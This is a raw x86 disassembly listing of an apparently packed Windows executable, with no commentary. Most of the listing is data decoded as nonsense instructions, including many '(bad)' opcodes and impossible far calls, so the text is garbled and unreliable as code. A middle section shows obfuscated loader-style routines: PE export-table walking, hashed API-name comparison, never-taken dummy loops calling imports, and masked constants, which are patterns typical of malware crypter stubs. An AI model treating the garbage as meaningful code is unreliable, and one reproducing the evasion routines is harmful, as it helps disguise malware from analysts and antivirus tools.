  40e590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e591:	jle    0x40e5a5
  40e593:	add    al,0x32
  40e595:	push   edx
  40e596:	mov    ds:0xd21cd701,eax
  40e59b:	push   0x48726b00
  40e5a0:	push   0xfffffff8
  40e5a2:	pop    ds
  40e5a3:	fs mov edi,0x4d03c04d
  40e5a9:	push   edx
  40e5aa:	cli    
  40e5ab:	jbe    0x40e542
  40e5ad:	imul   edx
  40e5af:	inc    esi
  40e5b0:	push   ebx
  40e5b1:	pop    ds
  40e5b2:	mov    dl,0x7d
  40e5b4:	or     eax,0x63d91b68
  40e5b9:	cdq    
  40e5ba:	xchg   ecx,eax
  40e5bc:	pusha  
  40e5bd:	mov    bh,0x27
  40e5bf:	inc    ebx
  40e5c0:	jbe    0x40e625
  40e5c2:	stc    
  40e5c3:	inc    ebp
  40e5c4:	test   BYTE PTR ds:0x74f3a591,dh
  40e5ca:	push   ebp
  40e5cb:	gs cmc 
  40e5cd:	jns    0x40e5aa
  40e5cf:	out    0x8c,eax
  40e5d1:	ss add ecx,esi
  40e5d4:	retf   
  40e5d5:	jge    0x40e5a2
  40e5d7:	enter  0x80ee,0xa8
  40e5db:	sub    al,0xfa
  40e5dd:	sub    DWORD PTR [ebx+edx*8+0xdf0b016],ecx
  40e5e4:	add    DWORD PTR [edi+0x2f],ecx
  40e5e7:	outs   dx,DWORD PTR ds:[esi]
  40e5e8:	call   0x2a1a:0x676b2aec
  40e5ef:	jae    0x40e5e7
  40e5f1:	and    cl,BYTE PTR [esi+0x79]
  40e5f4:	mov    edi,0x1ac449a0
  40e5f9:	or     ecx,DWORD PTR [ebp-0x749774d]
  40e5ff:	dec    esp
  40e600:	ret    
  40e601:	loope  0x40e5e2
  40e603:	popa   
  40e604:	(bad)  
  40e605:	jns    0x40e676
  40e607:	outs   dx,DWORD PTR ds:[esi]
  40e608:	and    eax,0x6e25cffd
  40e60d:	inc    ebp
  40e60e:	or     esp,DWORD PTR [ecx+0x13db050]
  40e614:	(bad)  
  40e615:	push   0x7bef7ef8
  40e61a:	outs   dx,DWORD PTR ds:[esi]
  40e61b:	fist   DWORD PTR [esi+ebx*4+0x35521300]
  40e622:	out    dx,al
  40e623:	mov    WORD PTR [eax-0x45],ds
  40e626:	sbb    eax,0x5f817bfc
  40e62b:	jno    0x40e61f
  40e62d:	loopne 0x40e5f2
  40e62f:	sbb    ah,cl
  40e631:	das    
  40e632:	jbe    0x40e5fd
  40e634:	into   
  40e635:	lds    esp,FWORD PTR [edx+0x63]
  40e638:	fidiv  WORD PTR [ebx+0x4f75e10a]
  40e63e:	xor    eax,0x4417c2b9
  40e643:	inc    eax
  40e644:	xor    al,BYTE PTR ds:[ebp-0xd106f19]
  40e64b:	adc    ah,0x33
  40e64e:	pusha  
  40e64f:	lahf   
  40e650:	fidiv  DWORD PTR [esi]
  40e652:	jge    0x40e5e0
  40e654:	hlt    
  40e655:	dec    ebx
  40e656:	aad    0xdd
  40e658:	push   0x46
  40e65a:	and    bh,0xd4
  40e65d:	icebp  
  40e65e:	mov    al,ds:0x382cf119
  40e663:	scas   eax,DWORD PTR es:[edi]
  40e664:	dec    edx
  40e665:	xor    edi,DWORD PTR [ebx+0xf]
  40e668:	xlat   BYTE PTR ds:[ebx]
  40e669:	cmp    DWORD PTR [edi],edi
  40e66b:	sbb    BYTE PTR [eax+ecx*8+0x19369a09],bh
  40e672:	and    al,0x46
  40e674:	cmc    
  40e675:	lea    eax,[ebx]
  40e677:	adc    DWORD PTR [ecx+0x7f3f9d86],edi
  40e67d:	adc    edi,DWORD PTR [edx]
  40e67f:	loopne 0x40e614
  40e681:	repz inc esi
  40e683:	aam    0xe5
  40e685:	ins    BYTE PTR es:[edi],dx
  40e686:	cmp    DWORD PTR [ecx+eiz*2-0x5f8f783],0xd
  40e68e:	dec    edi
  40e68f:	inc    esi
  40e690:	or     BYTE PTR [ecx+0x7c],dl
  40e693:	mov    esi,0x7f096a73
  40e698:	ret    
  40e699:	or     dh,cl
  40e69b:	and    al,0xe8
  40e69d:	pop    eax
  40e69e:	mov    ah,0x64
  40e6a0:	or     eax,0x129a2364
  40e6a5:	jnp    0x40e69e
  40e6a7:	mov    ebx,0x443ce3bd
  40e6ac:	out    dx,eax
  40e6ad:	js     0x40e68b
  40e6af:	retf   0x8673
  40e6b2:	mov    ds:0x9dc2e6b9,eax
  40e6b7:	cmc    
  40e6b8:	or     eax,0x8d332d62
  40e6bd:	pop    edi
  40e6be:	cs dec ebx
  40e6c0:	mov    WORD PTR [ecx-0x10f78da8],ss
  40e6c6:	sub    DWORD PTR [edi+0x7f],ebp
  40e6c9:	pop    ss
  40e6ca:	ds aad 0x31
  40e6cd:	push   cs
  40e6ce:	in     al,0xb0
  40e6d0:	pusha  
  40e6d1:	ja     0x40e663
  40e6d3:	add    al,0x2f
  40e6d5:	call   0x436a:0x4c16ddbe
  40e6dc:	add    DWORD PTR [edx+0x54],esi
  40e6df:	jbe    0x40e677
  40e6e1:	int3   
  40e6e2:	dec    ecx
  40e6e3:	xor    eax,0xdd87b03
  40e6e8:	adc    al,BYTE PTR [edi+0x5a]
  40e6eb:	outs   dx,BYTE PTR ds:[esi]
  40e6ec:	push   edx
  40e6ed:	fiadd  WORD PTR [edx-0x7e]
  40e6f0:	enter  0x9fad,0x94
  40e6f4:	imul   edx,esp,0xffffffe5
  40e6f7:	adc    bl,bh
  40e6f9:	fsub   QWORD PTR [esi-0x44]
  40e6fc:	xchg   ecx,eax
  40e6fd:	rol    al,1
  40e6ff:	dec    ecx
  40e700:	adc    BYTE PTR [eiz*2-0x1ebf3cdc],cl
  40e707:	fadd   st(2),st
  40e709:	retf   
  40e70a:	mov    cl,0xef
  40e70c:	in     eax,dx
  40e70d:	jp     0x40e728
  40e70f:	out    dx,eax
  40e710:	jmp    0x40e6d4
  40e712:	ret    0x9997
  40e715:	sub    bl,al
  40e717:	stos   BYTE PTR es:[edi],al
  40e718:	inc    ebp
  40e719:	retf   0x778f
  40e71c:	fwait
  40e71d:	scas   eax,DWORD PTR es:[edi]
  40e71e:	adc    al,BYTE PTR [ebp+0x30950723]
  40e724:	push   cs
  40e725:	test   BYTE PTR [ebx+0x44540ad4],al
  40e72b:	out    dx,eax
  40e72c:	mov    ?,WORD PTR [ebx-0x7dbe69c5]
  40e732:	rol    BYTE PTR [ebx+0x5c9db2b2],0x29
  40e739:	pop    es
  40e73a:	or     al,0x29
  40e73c:	jnp    0x40e727
  40e73e:	fstp   TBYTE PTR [edi]
  40e740:	stos   DWORD PTR es:[di],eax
  40e742:	loop   0x40e6ed
  40e744:	push   ss
  40e745:	jb     0x40e7b1
  40e747:	cld    
  40e748:	ret    0x292b
  40e74b:	push   es
  40e74c:	ins    BYTE PTR es:[edi],dx
  40e74d:	adc    esp,DWORD PTR [ebp+0x39]
  40e750:	add    al,0x10
  40e752:	lods   al,BYTE PTR ds:[esi]
  40e753:	sub    al,0x81
  40e755:	ins    DWORD PTR es:[edi],dx
  40e756:	jge    0x40e6e8
  40e758:	mov    esi,DWORD PTR [edi]
  40e75a:	jp     0x40e6e8
  40e75c:	scas   eax,DWORD PTR es:[edi]
  40e75d:	push   cs
  40e75e:	add    BYTE PTR [esi-0x238aaf08],bh
  40e764:	sub    esi,esp
  40e766:	cld    
  40e767:	je     0x40e6f5
  40e769:	jbe    0x40e724
  40e76b:	push   ecx
  40e76c:	xor    al,BYTE PTR [ebp+0xed76c9e]
  40e772:	dec    edx
  40e773:	div    BYTE PTR [esi+0x36]
  40e776:	cmp    al,0xec
  40e778:	xor    eax,0x2a28f541
  40e77e:	ds dec edx
  40e780:	shl    DWORD PTR [ebx],cl
  40e782:	sub    al,0x9e
  40e784:	cmp    eax,DWORD PTR [ecx-0x76]
  40e787:	xchg   esi,eax
  40e788:	pop    edx
  40e789:	pop    es
  40e78a:	repnz (bad) 
  40e78d:	xor    eax,0x9a1e83fb
  40e792:	mov    edx,ecx
  40e794:	pop    es
  40e795:	xchg   esi,eax
  40e796:	xchg   edi,eax
  40e797:	stos   BYTE PTR es:[edi],al
  40e798:	(bad)  
  40e799:	inc    edi
  40e79a:	pop    es
  40e79b:	shl    DWORD PTR [edx+ebp*4+0x36],0xa2
  40e7a0:	xchg   esi,eax
  40e7a1:	mov    ebx,0x7e842045
  40e7a6:	mov    BYTE PTR [esi-0x141e5be1],al
  40e7ac:	dec    ebx
  40e7ad:	push   0x9c8b0a38
  40e7b2:	sbb    al,0xbf
  40e7b4:	push   ecx
  40e7b5:	hlt    
  40e7b6:	add    bh,BYTE PTR [eax+edx*8]
  40e7b9:	mov    esp,0xe5aba992
  40e7be:	scas   eax,DWORD PTR es:[edi]
  40e7bf:	sti    
  40e7c0:	push   ecx
  40e7c1:	arpl   WORD PTR [ebp+0x2b650dec],sp
  40e7c7:	mov    ecx,ecx
  40e7c9:	xor    edi,DWORD PTR [esi-0x20]
  40e7cc:	fisub  WORD PTR [ecx+esi*2+0x75]
  40e7d0:	jp     0x40e756
  40e7d2:	pushf  
  40e7d3:	sbb    DWORD PTR [esi-0x79a50725],edi
  40e7d9:	xchg   DWORD PTR cs:[edi+0x6e],eax
  40e7dd:	arpl   WORD PTR [edx-0x7a4faf49],bx
  40e7e3:	sbb    ch,ch
  40e7e5:	pop    ss
  40e7e6:	mov    WORD PTR [eax+eiz*4-0x25],?
  40e7ea:	jbe    0x40e80b
  40e7ec:	fistp  WORD PTR [ecx+0x7f]
  40e7ef:	jns    0x40e7c6
  40e7f1:	mov    al,0x3c
  40e7f3:	inc    ecx
  40e7f4:	mov    BYTE PTR [ebx+0x1f],bh
  40e7f7:	sub    DWORD PTR [esi-0x38d70a82],ecx
  40e7fd:	js     0x40e801
  40e7ff:	daa    
  40e800:	neg    BYTE PTR [ebp+0x17a87188]
  40e806:	inc    edi
  40e807:	ins    BYTE PTR es:[edi],dx
  40e808:	retf   
  40e809:	dec    ebx
  40e80a:	fild   DWORD PTR [ebx]
  40e80c:	std    
  40e80d:	test   BYTE PTR ds:0xfe41e5b,0xba
  40e814:	test   edi,ebp
  40e816:	imul   BYTE PTR [bp-0x60]
  40e81a:	int3   
  40e81b:	(bad)  
  40e81c:	ficomp WORD PTR [ebx-0x32]
  40e81f:	jp     0x40e7f8
  40e821:	mov    bl,0xd9
  40e823:	pop    es
  40e824:	xchg   edi,eax
  40e825:	adc    eax,DWORD PTR [edx+0x615ce7ef]
  40e82b:	xchg   edi,eax
  40e82c:	pop    ebp
  40e82d:	test   ecx,0x3a7aaadc
  40e833:	mov    esi,0x450aff89
  40e838:	in     al,dx
  40e839:	popa   
  40e83a:	jne    0x40e83e
  40e83c:	xchg   esi,eax
  40e83d:	or     al,0x2a
  40e83f:	xor    BYTE PTR [edx+0xd],al
  40e842:	nop
  40e843:	je     0x40e801
  40e845:	cld    
  40e846:	mov    ch,0x91
  40e848:	and    ebx,DWORD PTR [edi]
  40e84a:	mov    ds:0x5f27c649,eax
  40e84f:	out    0xe,eax
  40e851:	jecxz  0x40e830
  40e853:	test   BYTE PTR [ebx+0x12],bl
  40e856:	xor    bl,BYTE PTR [eax]
  40e858:	test   BYTE PTR [ebx+edi*4-0x25],cl
  40e85c:	sbb    eax,edx
  40e85e:	mov    esi,edi
  40e860:	into   
  40e861:	cmp    al,0x8
  40e863:	(bad)  
  40e864:	jae    0x40e7e8
  40e866:	repnz pop esp
  40e868:	data16 (bad) 
  40e86a:	dec    esp
  40e86b:	(bad)  
  40e86c:	(bad)  
  40e86e:	out    0x72,al
  40e870:	mov    dl,0xd5
  40e872:	or     eax,0x15a0e65b
  40e877:	lds    ebx,FWORD PTR [bp+di-0x7fb6]
  40e87c:	pop    edi
  40e87d:	add    BYTE PTR [edx-0x42],dh
  40e880:	jbe    0x40e88a
  40e882:	cmp    al,0x19
  40e884:	jmp    0x40e8de
  40e886:	std    
  40e887:	stos   DWORD PTR es:[edi],eax
  40e888:	push   es
  40e889:	jmp    0x775644e9
  40e88e:	pop    ds
  40e88f:	test   DWORD PTR [ecx-0x3a],ebx
  40e892:	sub    dl,ah
  40e894:	int    0x2f
  40e896:	cmp    al,0x7c
  40e898:	push   ebp
  40e899:	lods   al,BYTE PTR ds:[esi]
  40e89a:	inc    ebx
  40e89b:	add    DWORD PTR [ebx+eiz*1],eax
  40e89e:	nop
  40e89f:	adc    cl,al
  40e8a1:	scas   eax,DWORD PTR es:[edi]
  40e8a2:	int    0x3d
  40e8a4:	jp     0x40e85c
  40e8a6:	add    eax,0x7e4d32fd
  40e8ab:	enter  0x74a7,0xca
  40e8af:	dec    eax
  40e8b0:	fst    QWORD PTR ds:0x2546562
  40e8b6:	cmp    esi,DWORD PTR [ebx]
  40e8b8:	mov    edi,0x41dbab0f
  40e8bd:	pushf  
  40e8be:	icebp  
  40e8bf:	(bad)  
  40e8c0:	loop   0x40e8c7
  40e8c2:	jb     0x40e8c6
  40e8c4:	cs xchg esi,eax
  40e8c6:	mov    ah,0xa6
  40e8c8:	jg     0x40e903
  40e8ca:	xchg   DWORD PTR [esi],edi
  40e8cc:	enterw 0x98a3,0x3f
  40e8d1:	dec    edx
  40e8d2:	adc    al,BYTE PTR [edi]
  40e8d4:	ss jg  0x40e86c
  40e8d7:	mov    esi,0x8ee13e86
  40e8dc:	cld    
  40e8dd:	int3   
  40e8de:	adc    ecx,DWORD PTR [ebp-0x7025b27c]
  40e8e4:	jmp    0x40e900
  40e8e6:	cmp    DWORD PTR [ecx-0x1f24d78f],eax
  40e8ec:	data16 mov ds:0x12dacf11,al
  40e8f2:	add    DWORD PTR [esi+0x25],esp
  40e8f5:	dec    ebp
  40e8f6:	leave  
  40e8f7:	ss push 0x31
  40e8fa:	(bad)  
  40e8fb:	into   
  40e8fc:	sbb    al,0x35
  40e8fe:	data16 je 0x40e955
  40e901:	mov    cl,0x7f
  40e903:	dec    ecx
  40e904:	daa    
  40e905:	pop    es
  40e906:	adc    eax,0x84051b
  40e90b:	xor    eax,0xd1e868eb
  40e910:	jmp    0xd9c3:0xf4cf7a2e
  40e917:	pusha  
  40e918:	imul   eax,DWORD PTR [edi],0x7f
  40e91b:	pop    esi
  40e91c:	call   0xf4a0:0x3ac06679
  40e923:	xchg   esp,eax
  40e924:	cmp    al,BYTE PTR [edx-0x292ba940]
  40e92a:	pop    esi
  40e92b:	sub    eax,0x7da217c0
  40e930:	add    edi,DWORD PTR [ecx]
  40e932:	xchg   ecx,eax
  40e933:	inc    ebx
  40e934:	mov    al,0xe2
  40e936:	mov    esi,0x8617a353
  40e93b:	fist   WORD PTR [edx]
  40e93d:	pop    ds
  40e93e:	int3   
  40e93f:	mov    bl,0x45
  40e941:	sbb    eax,0xf87a1dfc
  40e946:	dec    edi
  40e947:	ins    BYTE PTR es:[edi],dx
  40e948:	push   eax
  40e949:	adc    esi,esi
  40e94b:	xor    ebx,esp
  40e94d:	in     al,0xf6
  40e94f:	inc    edx
  40e950:	push   edx
  40e951:	call   0xed33:0x30eb9d11
  40e958:	fdiv   DWORD PTR [eax+0x27]
  40e95b:	fld    DWORD PTR [ecx+0x9]
  40e95e:	xor    bh,BYTE PTR [esi-0x47]
  40e961:	fadd   DWORD PTR ds:0xe1f964d3
  40e967:	into   
  40e968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e969:	stos   BYTE PTR es:[edi],al
  40e96a:	sub    BYTE PTR [ebx+0x58d3b8a3],cl
  40e970:	(bad)  
  40e971:	test   DWORD PTR [edx-0x17],0xe7ed948f
  40e978:	mov    BYTE PTR [ebp-0x3d],dh
  40e97b:	sbb    bl,bl
  40e97d:	adc    BYTE PTR [eax+0x34],dh
  40e980:	pop    ebp
  40e981:	ret    0x7e4a
  40e984:	and    BYTE PTR [eax],0x98
  40e987:	sbb    eax,0xcb3f6f63
  40e98c:	inc    eax
  40e98d:	idiv   DWORD PTR [esi]
  40e98f:	fwait
  40e990:	(bad)  
  40e991:	or     eax,0x6241802a
  40e996:	loop   0x40e9de
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	jne    0x40ec78
  40ecee:	sub    eax,0x7ccc7c7d
  40ecf3:	jl     0x40ed35
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	dec    eax
  40ecf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecfa:	jle    0x40ed44
  40ecfc:	jl     0x40ecda
  40ecfe:	xchg   esi,eax
  40ecff:	popa   
  40ed00:	hlt    
  40ed01:	jmp    0x40ecc0
  40ed03:	es pop edx
  40ed05:	cmc    
  40ed06:	in     al,dx
  40ed07:	add    eax,0xe3e8945
  40ed0c:	dec    esi
  40ed0d:	xor    dl,BYTE PTR [esi-0x3c]
  40ed10:	jmp    FWORD PTR [ebx+ecx*8+0x62293680]
  40ed17:	in     eax,dx
  40ed18:	push   0x595c8b8c
  40ed1d:	fiadd  WORD PTR [ebp+esi*8+0x46910b9d]
  40ed24:	pop    edx
  40ed25:	mov    edx,0x3bc4297d
  40ed2a:	call   0x33ef:0xa63ad4d6
  40ed31:	jo     0x40ed16
  40ed33:	and    al,0x74
  40ed35:	pop    ebp
  40ed36:	loope  0x40ecfd
  40ed38:	lods   al,BYTE PTR ds:[esi]
  40ed39:	fldcw  WORD PTR [ebp+ebp*1-0x5233e5e3]
  40ed40:	and    DWORD PTR ds:0xdd6886be,ecx
  40ed46:	js     0x40ed64
  40ed48:	dec    ebp
  40ed49:	xor    ch,BYTE PTR [esi]
  40ed4b:	lock stos DWORD PTR es:[edi],eax
  40ed4d:	cmc    
  40ed4e:	mov    esp,0xd2d2599d
  40ed53:	lock in eax,0x17
  40ed56:	xchg   edx,ecx
  40ed58:	cwde   
  40ed59:	pop    ds
  40ed5a:	sub    BYTE PTR [ecx+edi*1+0x23],al
  40ed5e:	and    al,0x35
  40ed60:	sbb    BYTE PTR gs:[ecx+0x4d],ch
  40ed64:	pop    ecx
  40ed65:	and    al,0x50
  40ed67:	repnz ins DWORD PTR es:[edi],dx
  40ed69:	cdq    
  40ed6a:	sbb    DWORD PTR [edx],ebx
  40ed6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6d:	dec    eax
  40ed6e:	pop    ecx
  40ed6f:	sbb    eax,0xdfe736ae
  40ed74:	xchg   DWORD PTR [eax],edx
  40ed76:	push   0x27
  40ed78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed79:	sub    ecx,edx
  40ed7b:	push   eax
  40ed7c:	cmc    
  40ed7d:	ds lahf 
  40ed7f:	das    
  40ed80:	sub    al,0xd2
  40ed82:	cmp    BYTE PTR [edi-0x17],cl
  40ed85:	push   cs
  40ed86:	or     al,BYTE PTR [ebp-0x2]
  40ed89:	fdiv   DWORD PTR [eax+0x4a5b039a]
  40ed8f:	add    edi,DWORD PTR [eax]
  40ed91:	mov    al,ds:0xa71c4f1b
  40ed96:	bound  ecx,QWORD PTR [ebx+0x18]
  40ed99:	xchg   edx,eax
  40ed9a:	mov    edi,0xbb3cb8ef
  40ed9f:	sti    
  40eda0:	sub    al,0x4f
  40eda2:	outs   dx,DWORD PTR ds:[esi]
  40eda3:	inc    ebp
  40eda4:	inc    esp
  40eda5:	sti    
  40eda6:	rsm    
  40eda8:	and    esi,DWORD PTR [esi+0x1ffea851]
  40edae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edaf:	fist   WORD PTR [ecx-0x5]
  40edb2:	add    al,0x5f
